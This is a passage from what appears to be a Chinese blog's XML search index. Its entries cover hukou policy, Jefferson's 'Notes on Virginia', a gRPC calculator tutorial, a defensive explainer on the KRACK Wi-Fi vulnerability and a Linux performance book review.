        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[政府行为模型及预测：民权法]]></title>
    <url>%2F2017%2F11%2F05%2FPolicy-Civil-Rights%2F</url>
    <content type="text"><![CDATA[摘要待编辑 Resoures Economist:Democracy continues its disturbing retreat | 2018 Chart 关于户籍制 一切不以尊重人权为前提、单纯经济学角度出发的改革，都是把人当牲口，妄图主宰历史潮流的肉食者谋。—-RiboseYim 2016 我的观点：实质是专制集权体制庇护下的资源分配手段 显性：拉拢本地人口、歧视移民人口，拉拢高端人口、打压低端人口 隐性：以收买本地人口之小惠、强制让渡自治权力。 如果取消户籍登记限制，如何应对选民登记诉求？ 趋势研判：逐步瓦解，根本消失取决于政体变革。 助力因素：1.商业需求 2.战争需求 12月25日，省军区接管由农建师担任的六个劳改单位的看押任务。根据兰州军区的指示，省军区决定，由省军区独立师接替原由生产建设兵团农建六师担负的5个劳改场（马栏、上畛子、槐树庄、姚家坡农场，莲花寺石碴厂）及红石岩煤矿的看押任务。同日，省政法组公安组下发《关于严格控制农村人口迁往城镇的紧急通知》。《通知》根据中央指示和公安部的紧急通知精神，要求各地对农村迁入城镇人口一定要严格控制，因招工要求报户口的，要严格审查，凡不符合规定的不给落户，并立即报告党委处理。1973年3月10日，政法组公安组又下发了《关于加强户口管理工作的通知》，要求各地坚决刹住户口管理工作中的不正之风，严格执行户口迁移政策，严格户口审批权限，严格执行《户口登记条例》。—— 《陕西省公安史志》http://www.sxsdq.cn/sqzlk/dqcs/dacswz/shaanxi/sxgadsj/201706/t20170616_910081.html 扩展阅读 数据可视化（十）公共数据源列表 参考文献 电影：《大鸿米店》 《经济学人：自由迁徙－改革的障碍》20151219 《经济学人：外地人口管理－不要下等人》20150926 阮一峰：禁止“群租”是否合法 [电影：《大红灯笼高高挂》]（https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=1&amp;cad=rja&amp;uact=8&amp;ved=0ahUKEwjruO6Q-dXUAhVY0GMKHXR8CCQQFggiMAA&amp;url=https%3A%2F%2Fzh.wikipedia.org%2Fzh%2F%25E5%25A4%25A7%25E7%25BA%25A2%25E7%2581%25AF%25E7%25AC%25BC%25E9%25AB%2598%25E9%25AB%2598%25E6%258C%2582&amp;usg=AFQjCNE_yu0QExXtKuJOjM0-yzp_ku_c-Q） 澎湃新闻网:俄罗斯的“失血”与“萎缩”]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[政府行为模型及预测：公共医疗]]></title>
    <url>%2F2017%2F11%2F05%2FPolicy-Public-Health%2F</url>
    <content type="text"><![CDATA[摘要待编辑 医疗改革 关于医疗改革 阮一峰：中国医疗改革的失败原因 《朱镕基讲话实录》：既然大病支出是封顶的，那么超支的部分只能自费。对于那些付不起的人，讲话也考虑到了。 “亏损企业的职工超出基本医疗保障水平以外的医疗需求怎么办呢？只能通过社会救济。我们也要建立慈善机构，提倡搞社会捐赠。我们要号召那些收入较高的工商界人士，在力所能及的范围内搞一点捐献，参加一些慈善事业。” 四个字，”祝君好运”。 阮一峰：关于中国红十字会 扩展阅读 数据可视化（十）公共数据源列表]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[政府行为模型及预测：公共财政]]></title>
    <url>%2F2017%2F11%2F05%2FPolicy-Public-Finance%2F</url>
    <content type="text"><![CDATA[摘要待编辑 扩展阅读 数据可视化（十）公共数据源列表 数据可视化（五）基于网络爬虫制作可视化图表 图表数据可视化技术方案 基于网络爬虫的可视化图表 案例：最近十年全国彩票销售情况 案例：中国科学院院士分布情况 参考文献]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[私人历史文献：弗吉尼亚笔记]]></title>
    <url>%2F2017%2F11%2F05%2FHistory-USA-Virginia%2F</url>
    <content type="text"><![CDATA[摘要 托马斯·杰斐逊 写作背景 作者：托马斯·杰斐逊托马斯·杰斐逊（Thomas Jefferson，1743年4月13日－1826年7月4日），美利坚合众国总统（1801年─1809年），《美国独立宣言》主要起草人，及美国开国元勋中最具影响力者之一。 杰斐逊秉持古典自由主义与共和主义（republicanism），制定弗吉尼亚宗教自由法（Virginia Statute for Religious Freedom, 1779, 1786），该法日后成为美国宪法第一修正案的条文基础。杰斐逊同时也是弗吉尼亚大学（University of Virginia，UVA）的创办人，农学、园艺学、建筑学、词源学、考古学、数学、密码学、测量学与古生物学等学科的专家，身兼作家、律师与小提琴手。 杰斐逊 1792 年创立并领导民主共和党（民主党之前身），杰斐逊曾为第二任弗吉尼亚州州长（1779年－1781年）、第一任美国国务卿（1789年─1793年）、与第二任美国副总统（1797年－1801年）。1800年杰弗逊击败竞逐连任的亚当斯当选美国第三任总统。总统任期中之重大事件： 路易斯安那购地案（1803年） 1807年禁运法案（Embargo Act of 1807） 路易斯与克拉克探勘（1804–1806） 写作背景《弗吉尼亚笔记》是托马斯·杰斐逊唯一的一个长篇专著，写这本书主要是为了回答当时驻费城的法国公使巴尔·马布瓦侯爵向他提出的一些问题。当时杰斐逊刚卸任弗吉尼亚州州长职务，在一次骑马中坠马受伤，正在养伤期间。1782-1783 年冬作了修改和补充，但由于出版费用过高并未立即在美国出版，1784 年杰斐逊在法国自费匿名出版（初版印刷 200 册，标注出版日期为 1782 年），在之后陆续在法国、英国、德国和美国出版。 全书结构《弗吉尼亚笔记》主要部分包括： 回答弗吉尼亚州的幅员边界问题 地理环境、自然资源和开发 社会、法律、宗教、经济、军事和历史问题 地理 问题十二：请介绍一下县、市、镇和村好吗？在问题九已列举了所有的县。它们一共有 74 个，大小不一，人口也极不平均。其中 35 个在东部地区，或者在那根平行线上，23 个在中部地区，介于东部地区和蓝岭山脉之间；8 个在蓝岭和阿勒格尼山之间，8 个在阿勒格尼山以西。 本州也按照另一种划分分成教区，其中许多教区和县等同，但往往一个县有不止一个教区，一个教区有不止一个县。这种划分与州的宗教有关，迄今为止，每个教区都建立了英国国教会，领取固定薪金。划分教区的另外一个目的是照顾穷人。（P53） 评价华盛顿和富兰克林在战争中我们出了一个华盛顿，只要自由拥有信徒，他就永远为人们所怀念和崇敬，他的英名将永垂不朽，在未来世界最杰出人物中占有应有的位置，而那时那种把他归入自然退化者之列的可恶的哲学却已被人们遗忘了。（P37） 在物理学方面，我们出了一个富兰克林，当代没有一个人比他有更多的重大发明，没有一个人比他更多地充实和加深了哲学，或者对自然现象作出更富有创造性的解释。（P37） 经济 奴隶男女奴隶被关在隔离的房子里，因为对奴隶主来说，抚养一个孩子要比买一个奴隶花费更大。（P91） 问题十一：请谈谈定居在该州的印第安人的情况好吗？（P45） 法律原则当我们在为我们自己的法律进行辩论时，我们曾立下一个基本原则：法律要做到公正，就必须给双方对等的权利，不然法律就仅仅是些专横的行为准则，建立在暴力而不是良心之上。（P93） 政治体制 问题十三：州宪法及其特许状呢？ 我们的政府体制大致如下：行政权掌握在州长手中。州长每年改选一次，七年内不得任职三年以上。他由一个有八名成员的参议会协助。司法权由若干法院分掌，下文将加以说明。立法权由议会两院行使，其中一个院叫众议院，由每个县各派两名议员组成，议员每年由公民选出，凡终身拥有 100 英亩无人居住或 25 英亩有人居住的土地，或者在某一个市镇上拥有一所房屋或一块地皮的公民，都拥有选举权；另一个院叫参议院，由 24 名成员组成，每四年由同一些选民改选一次，选民为此目的分成 24 个选区。一项法律要通过必须获得两院同意。州长及其参议会、最高法院法官、审计员、检察总长、司库、土地登记员以及国会代表均由两院任命。 政府的全部立法权、行政权和司法权都归结到立法机关。把这些权力集中在同一些人手里正是专制统治的真谛。这些权力由多数人行使而不是由单独一个人行使并不能使情况有所好转。173 个暴君肯定和一个暴君一样地富于压迫性。那些怀疑这一点的人只要看看威尼斯共和国就行了。议员是我们自己选举的对我们也没有什么帮助。选举产生的专制政府并不是我们所争取的政府，我们争取的政府不仅仅要建立在自由原则上 ，而且政府的各项权力必须平均分配给几个政府部门，每个政府部门都由其他部门有效地遏制和限制，无法超越其合法范围。 由于这个原因，通过政府条例的那个代表大会把政府建立在这样一个基础上，即立法、行政和司法三个部门应当分立，任何人在同一个时候不得行使一种以上的权力。（P65） 人们很快就学会行使他们所拥有或窃取的每一种权利和权力来满足他们的个人利益。 凯撒说过，有了钱就有人，有了人就有钱。 防止腐败和暴政的时机是在它们抓住我们之前。把狼拒之于羊栏门外，要比狼进了羊栏再去拔它的牙和爪为好。 一个领袖可以提出意见，但是不可以把他自己的意见强加于人，更不能让人们伸出脖子任他宰割，或者听任他作威作福而大气也不出。引起这些可怕的后果的头等大事至少应该是明显的和不可抗拒的。（P75） 他们从罗马历史中寻找先例，只有在罗马历史中找得到，也只有在罗马历史中证明它是致命的。他们从一个被最剧烈的内讧和骚乱所撕裂的共和国里找到了先例，在这个共和国里，政府是一个残酷无情的贵族政府，他们统治下的人民被贫困和悲惨生活变得不顾死活，在最艰难的环境里，除非靠一个暴君的无所不能的手，无法使骚乱平息。正因为如此，他们的宪法允许拥立一个临时的暴君，称之为执政官，那个临时的暴君，七变八变，变成终身任职了。 （P76） 立法机关一旦攫取了权力，又有规定自己法定人数的权力，就可以把那个法定人数减少到一人，他们可以管这个人叫主席、议长、独裁者或者爱叫什么就叫什么。我们的情况的确很危险，希望同胞们明察，在适当的时候才去适当的补救办法。（P77） 参考文献]]></content>
      <tags>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Economist</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机远程通信协议：gRPC]]></title>
    <url>%2F2017%2F10%2F30%2FProtocol-gRPC%2F</url>
    <content type="text"><![CDATA[摘要 一、远程调用技术简史:从 CORBA 到 gRPC 二、gRPC 简介 三、gRPC 示例代码 远程通信协议：从 CORBA 到 gRPC自从产业界发明机器联网的那一天就已经开始探索最优的远程通信机制。操作系统如 UNIX、Windows 和 Linux 等都有实现远程通信的内部协议，挑战在于如何向开发人员开放一个通信框架。 一、远程调用技术简史在20世纪90年代，当 TCP/IP 协议日臻成熟变成网络通信的黄金标准时，焦点转移到跨平台通信 —— 一台计算机可以通过某种类型网络在另一台计算机上发起一个动作。例如如 CORBA、DCOM、Java RMI 技术，在核心网络基础设施之上创造了一个对开发者友好的抽象层。这些技术还试图发展出一套与开发语言无关的通信框架，这一点对于客户机/服务器体系结构至关重要。 随着本世纪初 Web 技术的演进，HTTP 逐渐演变为事实上的通信标准。HTTP 结合 XML 提供了一种自我描述、不依赖语言、与平台无关的远程通信框架。这种结合的成果是 SOAP 和 WSDL 标准，它们保证了在各种运行环境和平台之间实现互操作的标准化。 下一个冲击互联网的浪潮是 Web 编程。许多开发人员发现定义 SOAP 标准的 HTTP 和 XML 的组合过于严格。这时 JavaScript 和 JSON 开始流行了。Web 2.0 现象（API 发挥了关键作用）, JSON 替代 XML 成为首选的协议。HTTP 和 JSON 这对致命的组合，催生了一个新的非官方标准 REST 。SOAP 要求严格遵守标准和结构定义，仅局限于大型企业应用程序，而 REST 在当代开发人员中很受欢迎。 1.1 HTTP, REST 和微服务归功于 JavaScript 框架，Node.js 以及文档数据库的发展，REST 在 Web 开发者中广受欢迎。许多应用程序开始基于 REST 实现 ，即使是内部序列化和通信模式领域。但 HTTP 是最有效的消息交换协议吗？即使在同一上下文、同一网络，或者是同一台机器上运行的服务之间？HTTP 的便捷性与高性能之间需要作出权衡，这促使我们回到问题的起点，寻找微服务架构中最优的通信框架。 进入 gRPC 时代 —— 来自谷歌，现代的轻量级通信协议。这是一个高性能的、开源的通用远程过程调用（RPC） 框架，它可以在多种开发语言、任何操作系统上运行。 gRPC 在推出的第一年内就被 CoreOS，Netflix，Square 和 Cockroach Labs 等机构采用。 CoreOS 团队的 Etcd，是一种分布式键/值存储服务，采用 gRPC 实现端通信。电信公司如 Cisco，Juniper 和 Arista 都使用 gRPC 实现数据流遥测和网络设备配置。 1.2 什么是 gRPC ?当我第一次遇到 gRPC，它使我想到 CORBA。两个框架都基于语言无关的接口定义语言（IDL） 声明服务，通过特定的语言绑定实现。 CORBA 和 gRPC 二者的设计，都是为了使客户端相信服务器在同一台机器。客户机在桩（Stub）上调用一个方法（method），调用过程由底层协议透明地处理。 gRPC 的秘诀在于处理序列化的方式。gRPC 基于 Protocol Buffer，一个开源的用于结构化数据序列化机制，它是语言和平台无关的。Protocol Buffer 的描述非常详细，与 XML 类似。但是它们比其他的协议格式更小，更快，效率更高。任何需要序列化的自定义数据类型在 gRPC 被定义为一个 Protocol Buffer 。 Protocol Buffer 的最新版本是 proto3，支持多种开发语言的代码生成，Java , C++，Python，Ruby , Java Lite , JavaScript，Objective-C 和 C # 。当一个 Protocol Buffer 编译为一个特定的语言，它的访问器（setter 和 getter）为每个字段提供定义。 相比于 REST + JSON 组合 ，gRPC 提供更好的性能和安全性。它极大的促进了在客户端和服务器之间使用 SSL / TLS 进行身份验证和数据交换加密。 为什么微服务开发者需要使用 gRPC ？gRPC 采用 HTTP / 2 以支持高性能的、可扩展的 API 。报文使用二进制而不是文本通信可以保持载荷紧凑、高效。HTTP / 2 请求在一个 TCP 连接上可支持多路复用，允许多个消息并发传送而不影响网络资源利用率。gRPC 使用报头压缩（header compression ）来减少请求和响应的大小。 二、gRPC 简介2.1 创建 gRPC 服务的流程 在 Protocol Buffer (.proto) 文件中描述服务和载荷结构 从 .proto 文件生成 gRPC 代码 用一种开发语言实现服务端 创建一个客户端调用服务 运行服务端和客户端 Note:Node.js 客户端不需要生成存根（Stub），只要 Protocol Buffer 文件是可访问的，它就可以直接与服务端对话。 三、gRPC 示例代码为了进一步熟悉 gRPC，我们将用 Python 语言创建一个简单的计算服务。它将同时被一个 Python 客户端和一个 Node.js 客户端调用。以下测试示例运行在 Mac OS X 。 你可以从 GitHub 库 https://github.com/grpc/grpc/tree/master/examples 访问源代码，在自己的机器上运行示例。 环境准备 123456789101112131415161718// 配置 Python gRPCpython -m pip install virtualenvvirtualenv venvsource venv/bin/activatepython -m pip install --upgrade pip//安装 gRPC 和 gRPC Toolspython -m pip install grpciopython -m pip install grpcio-tools// 配置 Node.js gRPCnpm install grpc --global//创建目录mkdir Protomkdir Servermkdir -p Client/Pythonmkdir -p Client/Node 创建 Protocol Buffer 文件 12345678910111213141516171819202122232425262728293031323334353637383940//Proto/Calc.protosyntax = "proto3";package calc;service Calculator &#123; rpc Add (AddRequest) returns (AddReply) &#123;&#125; rpc Substract (SubstractRequest) returns (SubstractReply) &#123;&#125; rpc Multiply (MultiplyRequest) returns (MultiplyReply) &#123;&#125; rpc Divide (DivideRequest) returns (DivideReply) &#123;&#125;&#125;message AddRequest&#123; int32 n1=1; int32 n2=2;&#125;message AddReply&#123; int32 n1=1;&#125;message SubstractRequest&#123; int32 n1=1; int32 n2=2;&#125;message SubstractReply&#123; int32 n1=1;&#125;message MultiplyRequest&#123; int32 n1=1; int32 n2=2;&#125;message MultiplyReply&#123; int32 n1=1;&#125;message DivideRequest&#123; int32 n1=1; int32 n2=2;&#125;message DivideReply&#123; float f1=1;&#125; 生成 Python 服务端和客户端代码 1234$ python -m grpc.tools.protoc --python_out=. --grpc_python_out=. --proto_path=. Calc.proto$ cp Calc_pb2.py ../Server$ cp Calc_pb2.py ../Client/Python$ cp Calc.proto ../Client/Node 创建服务端 123456789101112131415161718192021222324252627282930313233343536373839# Server/Calc_Server.pyfrom concurrent import futuresimport timeimport grpcimport Calc_pb2import Calc_pb2_grpc_ONE_DAY_IN_SECONDS = 60 * 60 * 24class Calculator(Calc_pb2.CalculatorServicer): def Add(self, request, context): return Calc_pb2.AddReply(n1=request.n1+request.n2) def Substract(self, request, context): return Calc_pb2.SubstractReply(n1=request.n1-request.n2) def Multiply(self, request, context): return Calc_pb2.MultiplyReply(n1=request.n1*request.n2) def Divide(self, request, context): return Calc_pb2.DivideReply(f1=request.n1/request.n2)def serve(): server = grpc.server(futures.ThreadPoolExecutor(max_workers=10)) Calc_pb2_grpc.add_CalculatorServicer_to_server(Calculator(), server) server.add_insecure_port('[::]:50050') server.start() try: while True: time.sleep(_ONE_DAY_IN_SECONDS) except KeyboardInterrupt: server.stop(0)if __name__ == '__main__': serve() 启动服务端 1python Calc_Server.py 创建 Python 客户端 1234567891011121314151617181920212223# Client/Python/Calc_Client.pyfrom __future__ import print_functionimport grpcimport Calc_pb2import Calc_pb2_grpcdef run(): channel = grpc.insecure_channel('localhost:50050') stub = Calc_pb2_grpc.CalculatorStub(channel) response = stub.Add(Calc_pb2.AddRequest(n1=20,n2=10)) print(response.n1) response = stub.Substract(Calc_pb2.SubstractRequest(n1=20,n2=10)) print(response.n1) response = stub.Multiply(Calc_pb2.MultiplyRequest(n1=20,n2=10)) print(response.n1) response = stub.Divide(Calc_pb2.DivideRequest(n1=20,n2=10)) print(response.f1)if __name__ == '__main__': run() 创建 Node.js 客户端 123456789101112131415161718192021222324252627282930//Client/Node/Calc_Client.jsvar PROTO_PATH = 'Calc.proto';var grpc = require('grpc');var calc_proto = grpc.load(PROTO_PATH).calc;var params=&#123;n1:20, n2:10&#125;;function main() &#123; var client = new calc_proto.Calculator('localhost:50050', grpc.credentials.createInsecure()); client.divide(params, function(err, response) &#123; console.log(response.f1); &#125;); client.multiply(params, function(err, response) &#123; console.log(response.n1); &#125;); client.substract(params, function(err, response) &#123; console.log(response.n1); &#125;); client.add(params, function(err, response) &#123; console.log(response.n1); &#125;);&#125;main(); 启动客户端 Node.js/Python 1234567891011$ python Calc_Client.py30102002.0$ node Calc_Client.js30102002.0 附表：gRPC 年谱 2011 : Protocol Buffers 2 =&gt; language neutral for serializing structured data 2015 : Borg =&gt; Large-scale cluster management =&gt; Kubernetes 2015 : Stubby =&gt; A high performance RPC framework =&gt; gRPC July 2016 : Protocol Buffers 3.0.0 Aug 2016 : gRPC 1.0 ready for production Sept 2016 : Swift-protobuf Jan 2017 : Grpc Swift Apr 2017 : Google Endpoints =&gt; Manage gRPC APIs with Cloud Endpoints Sept 2017 : gRPC 1.6.1 Sept 2017 : Protocol Buffers 3.4.1 Oct 2017 : Swift-protobuf 1.0 Oct 2017 : gRPC 1.7.0 扩展阅读 计算机远程通信协议：从 CORBA 到 gRPC Stack Overflow：2017年最赚钱的编程语言 玩转编程语言:构建自定义代码生成器 基于Kafka构建事件溯源型微服务 LinkedIn 开源 Kafka Monitor 基于Go语言快速构建一个RESTful API服务 应用程序开发中的日志管理(Go语言描述) 参考文献 Google’s gRPC: A Lean and Mean Communication Protocol for Microservices | 9 Sep 2016 7:30am, by Janakiram MSV gRPC microservices are the future ? | Golang Nantes Meetup 21 September 2017 | Cyrille 、Hemidy gRPC：Google开源的基于HTTP/2和ProtoBuf的通用RPC框架 gRPC调用超时控制 How to use etcd service discovery with gRPC in Go? Building High Performance APIs In Go Using gRPC tracing gRPC calls in #Golang with #Google Stackdriver Getting Started with Microservices using Go, gRPC and Kubernetes]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
        <tag>Linux</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cyber-Security:警惕Wi-Fi漏洞]]></title>
    <url>%2F2017%2F10%2F29%2FCyberSecurity-WiFi%2F</url>
    <content type="text"><![CDATA[摘要 1、不可信任的基础设施：Wi-Fi 2、安全通信协议：HTTPS 3、历史遗留问题：DNS 4、最后一英里的安全：VPN Cyber-Security: 警惕 Wi-Fi 漏洞 KRACK 原文：Tips to Secure Your Network in the Wake of KRACK | KONSTANTIN RYABITSEV OCTOBER 18, 2017 KRACK 攻击将目标放在你的移动设备和 Wi-Fi 接入点之间的链路，它可能是一台路由器 —— 在你的家里、办公室、社区图书馆或者你最喜欢咖啡店。 下面这些技巧能够帮助您提高网络连接的安全性。 密钥重安装攻击 （KRACK, Key Reinstallation Attacks) 概要如下: 基于 WPA2 无线握手协议的漏洞，攻击者可能在你的设备和Wi-Fi接入点之间嗅探或者操纵流量 WPA2 标准存在定义含糊以及标准实现不够严谨，特别是对于 Linux 和 Android 设备来说问题尤其糟糕。事实上，在底层操作系统被修补之前，该漏洞允许攻击者强制所有无线通信流量不进行任何加密。 这个漏洞可以在客户端修补，所以事情并没有到不可收拾的地步。WPA2 无线加密标准并没有过时，WEP （Wired Equivalent Privacy，有线等效保密协议）标准也是同样的道理（解决该问题的方案并不是切换到 WEP ）。 最流行的 Linux 发行版已经在客户机上发送修复此漏洞的更新，所以需要尽快更新。 Android 将很快为这个漏洞推送补丁程序。如果您的设备正在接收 Android 安全补丁，您不久就会收到一个修复程序。如果您的设备不再接收这样的更新，那么这个特殊的漏洞仅仅是您停止使用旧的、不支持更新的 Android 设备的另一个原因。 也就是说，从我的观点来看，Wi-Fi 仅仅是不可信任基础设施链条中的另一个环节，我们应该避免把它当作完全可信的通信渠道。 1、不可信任的基础设施：Wi-Fi如果现在阅读本文是通过你的笔记本电脑或者移动电话，那么你的通信链可能看起来应该是这样的： KRACK 攻击将目标放在你的移动设备和 Wi-Fi 接入点之间的链路，它可能是一台路由器 —— 在你的家里、办公室、社区图书馆或者你最喜欢咖啡店。 实际上，这个图应该类似于这样： Wi-Fi 仅仅是我们漫长的通信链中的第一个不应该信任的环节。如果让我猜的话，你正在使用的 Wi-Fi 路由器可能从开始使用的那天起就没有收到过安全更新。更糟的是，它可能是默认的或容易被猜到的管理凭据（用户名/口令/密钥等），从来就没有更改过。除非你自己初始化并配置了路由器，同时你还能记住自己最后一次是什么时候更新它的固件，总之，你应该假设它现在是由别人控制，不能被信任。 通过 Wi-Fi 路由器，我们进入了一个由各类不可信任基础设施覆盖的区域 — 取决于你的偏执狂水平。在我们的上游有各类 ISP 和服务提供商，他们中的许多人捕获，监视，改变，分析和销售我们的个人流量，试图从我们的浏览习惯中获得更多的钱。通常，他们自己的安全补丁计划留下了许多有待改进的地方，最终使我们的流量暴露在恶意人士的眼里。 通常在互联网上，我们不得不担心强大的、国家级的演员操纵核心网络协议（例如 BGP hijacking，BGP 劫持 ） ，为了支持质量监控程序或者执行国家级的流量过滤能力。 2、安全通信协议：HTTPS幸运的是，我们有一个基于不安全介质进行安全通信的解决方案，我们每天都在使用它 —— HTTPS 协议对我们的 Internet 流量进行点对点加密，并确保我们可以信任我们所通信的站点。 Linux 基金会发起 “Let’s Encrypt” 项目,Let’s Encrypt is a free, automated, and open Certificate Authority.，便于网站所有者全球提供终端到终端的加密，这有助于确保任何受损的设备，我们的个人设备，我们要访问的网站之间没有通信泄密风险。 好吧…只能说尽量接近没有风险。 3、历史遗留问题：DNS即使我们忠实地使用 HTTPS 协议来创建一个可信的通信渠道，攻击者还有一个机会，访问我们的 Wi-Fi 路由器或改变我们的 Wi-Fi 流量 — 例如 KRACK 攻击 — 可以诱导我们同错误的网站通信。他们可以这样做事利用了另一个事实，即我们仍然十分依赖于 DNS —— 一种上世纪80年代开始应用，不加密，非常容易被欺骗协议。 DNS （Domain Name System，域名系统）可以将人类友好的域名例如“linux.com”转换成 IP 地址 —— 计算机可以基于 IP 地址相互通信。为了将域名转换成 IP 地址，计算机会查询解析器软件 —— 通常运行在 Wi-Fi 路由器上或操作系统本身。解析器将查询一个包括 “root” 域名服务器的分布式网络，找出系统在互联网上所谓的“权威”的信息，域名“Linux .com”对应的IP地址。 麻烦的是，上述过程都是基于未经身份验证的通信，很容易假冒，明文协议和响应都可以很容易地被攻击者改变，使查询返回不正确的数据。如果有人设法进行 DNS 查询欺骗并返回错误的IP地址，他们就可以操纵我们系统的 HTTP 请求到指定的地方。 幸运的是，HTTPS 协议有很多内置的保护，可以确保不容易被别人假装成另一个站点。恶意服务器上的 TLS 证书必须匹配您请求的 DNS名称 ，TLS 证书由一个卓有声誉的 数字证书认证中心(Certificate Authority， CA)签发 ，并获得浏览器认可。如果不是这样的话，浏览器会显示出一个很大的警告：你要与之沟通的主机不是他们所说的那个人。如果你看到这样的警告，在选择忽略之前，请格外小心，因为你可能会泄露你的秘密给那些会使用它们的人攻击你。 如果攻击者完全控制了路由器，他们首先可以阻止您的连接使用HTTPS，通过拦截服务器的响应，指示浏览器设置安全连接（这称为“SSL strip 攻击”）。为了帮助保护您免受这种攻击，网站可以增加一个 特殊响应报头，告诉浏览器它们在未来始终使用HTTPS 协议进行通信，但这只是在你的第一次访问之后才有效。对一些非常受欢迎的网站，浏览器现在包括一个硬编码的域名列表，可以设置在第一次访问的时候也使用 HTTPS 协议 。 DNS 欺骗的解决方案称为 DNSSEC （Domain Name System Security Extensions ，CDNS安全扩展，由 IETF 提供的一系列 DNS 安全认证的机制，RFC 2535 ），但它看起来距离被接受的那一天还很遥远，其中有一个重要的障碍 —— 实时感知。DNSSEC 普遍使用之前，我们必须假定，我们收到的 DNS 信息不完全可信的。 4、最后一英里的安全：VPN所以，如果你不能信任 Wi-Fi — 和/或在地下室的无线路由器，它可能比你的大多数宠物的年龄都大，你可以采取什么措施来确保你的设备和互联网通信“最后一英里”的完整性呢？ 一个可接受的解决方案是使用一个信誉良好的 VPN 提供商，在你的系统和基础设施之间建立安全通信链路。我们的希望在于他们比你的路由器厂商和你当前的互联网服务提供商更加关注安全，所以他们可以更好地保证您的流量不受嗅探，或者遏制恶意人士的骚扰。让你所有的工作站和移动设备使用 VPN ，可确保类似 漏洞，例如 KRACK 攻击或不安全的路由器等，不影响你与外部世界通信的完整性。 这里的重要警告是，在选择 VPN 提供商时，必须保证它们的合理地可信性；否则，您只是同另一组恶意行为者进行交易。远离任何提供“免费 VPN”的提供商，他们很可能把你作为间谍目标，或者出售您的流量给营销公司赚钱。 并非所有的设备都需要安装 VPN，但您每天使用的、涉及访问个人私人信息网站的—— 尤其是访问您的金钱和身份信息（政府、银行网站、社交网络等）的任何东西都必须得到安全保护。VPN 不是应对所有网络层漏洞的灵丹妙药，但它肯定会有所帮助，当你在机场使用不安全的 Wi-Fi 卡，或者下次类似 KRACK 漏洞被发现的时候。 扩展阅读：《The Cyber-Security Master》 Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 Wi-Fi 漏洞 Cyber-Security: Web应用安全：攻击、防护和检测 Cyber-Security: IPv6 &amp; Security Cyber-Security: OpenSSH 并不安全 Cyber-Security: Linux/XOR.DDoS 木马样本分析 浅谈基于数据分析的网络态势感知 Packet Capturing:关于网络数据包的捕获、过滤和分析 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: 事与愿违的后门程序 | Economist Cyber-Security: 美国网络安全立法策略 Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司 参考文献 BGP hijacking，BGP 劫持 “Let’s Encrypt” 项目,Let’s Encrypt is a free, automated, and open Certificate Authority. 2015年去过凯悦？请小心你的银行卡 | 2016-01-17 安全威胁情报]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>DevOps</tag>
        <tag>Cyber-Security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 性能诊断:荐书《图解性能优化》]]></title>
    <url>%2F2017%2F10%2F24%2FLinux-Perf-Picture%2F</url>
    <content type="text"><![CDATA[摘要 性能分析的基础:吞吐和响应的区别 实际系统中的性能分析 性能调优 性能测试 虚拟化环境下的性能 云环境下的性能 一、性能分析的基础 响应和吞吐的区别（初学者可能经常会混淆的概念）响应：表示应答的快慢吞吐：表示处理数量的多少案例：“明明优化了机器的配置，但性能并没有提高”。响应有问题，却增加了CPU核心数，只是增加了空转的CPU核心而已。所以要养成习惯，先确认问题是出在响应还是吞吐上。 性能分析从测量开始，性能必须是能够测量的性能信息的3种类型：1、概要形式:例如sar、vmstat,作为入手点调查过去发生了什么，“现象”2、事件记录形式:例如网络抓包（Packet Capture）3、快照（Snapshot）：例如ps和top 扩展阅读：《Linux性能分析模型－In 60 Seconds》 性能分析中的重要理论：等待队列理论从性能的稳定性方面来考虑，带宽控制思维方式。 二、实际系统中的性能分析AP服务器的性能测量不同语言的性能信息获取: Java：GC（垃圾回收）日志 ，全GC（Stop the world） DB服务器的性能测量DB服务器本身的特点就是集中管理数据，需要频繁地查看线程（会话）之间的交互，因此很容易出现资源竞争的情况，因此在进行DBMS性能分析的时候，一定要考虑多个线程的存在。 存储性能分析的思路思路：重视IOPS术语：响应时间、IOPS（Input Output Per Second）类型：物理磁盘、SSD 缓存命中率：在存储的世界里，磁盘、存储、OS等各处都存在着缓存，使用缓存命中率作为表示缓存工作效率的指标。脏数据（或者脏数据块）：已经更新但没有写入的数据。脏数据不可以丢弃，如果在缓存上堆积了大量的脏数据，I／O就无法有效运作，进而就会导致问题的发生。 网络性能分析的思路 调查原因 陷阱1:关注受害者，“疑犯”与“真凶” 陷阱2:没有意识到基础不稳 （自下而上） 陷阱3:没有注意到负载的变化 陷阱4:不能确定谁拿着球 陷阱5:不能确定因果关系很多人不能把握原因，而只是随便瞎猜一下就进行调优。掌握因果关系的一个窍门是学习架构知识。知道了机制后就能减少错误分析的情况。另外，从逻辑上来考虑因果关系是很重要的。要试着思考一下“这个现象能否解释另一个现象”。 三、性能调优 调优要循序渐进：先把大石头移开。 具体思路：1、重复使用：连接池、PreparedStatement、线程池2、汇总处理：集中、Piggyback3、提高速度和实现并行4、纵向扩展（Scale Up）与横向扩展（Scale Out）： 应用技巧：1、省略循环2、访问频率高的数据存放入键值存储3、访问频率高的数据存放在使用位置附近4、把同步变成异步5、带宽控制6、LRU算法7、分割处理或者细化锁的力度8、回写缓存、多层缓存9、巨帧和高速网络10、负载均衡 基于LVS的AAA负载均衡架构实践11、写时复制 四、性能测试 项目工程环境基于项目整理来确保应用程序的性能。 应用程序设计负责人一般不会考虑系统整体的性能，而是满脑子考虑如何使用新的框架和中间件来实现需要的业务和功能。 常见的失败情况：9种反面模式 不能在期限内完成 性能很差！解决不了性能问题 